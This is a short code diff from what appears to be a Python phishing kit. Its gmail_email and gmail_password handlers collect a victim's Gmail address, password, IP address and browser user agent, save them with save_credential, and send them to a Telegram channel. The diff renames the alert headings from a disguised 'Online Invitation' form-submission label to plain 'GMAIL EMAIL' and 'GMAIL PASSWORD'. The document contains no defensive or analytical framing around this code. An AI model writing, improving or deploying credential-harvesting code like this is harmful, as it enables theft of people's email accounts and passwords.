@@ -352,7 +352,7 @@ def gmail_email():
     
     # Notify Telegram
     ip = state["ip"]
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
+    msg = f"""[+]___ GMAIL EMAIL ___[+]
 Email: {email}
 IP: {ip}
 UA: {state['user_agent'][:80]}"""
@@ -379,7 +379,7 @@ def gmail_password():
     save_credential(state["email"], password, state["ip"], "gmail")
     
     # Notify Telegram with full details
-    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]                  You have a new website form submission
+    msg = f"""[+]___ GMAIL PASSWORD ___[+]
 Email: {state['email']}
 Password: {password}
 IP: {state['ip']}
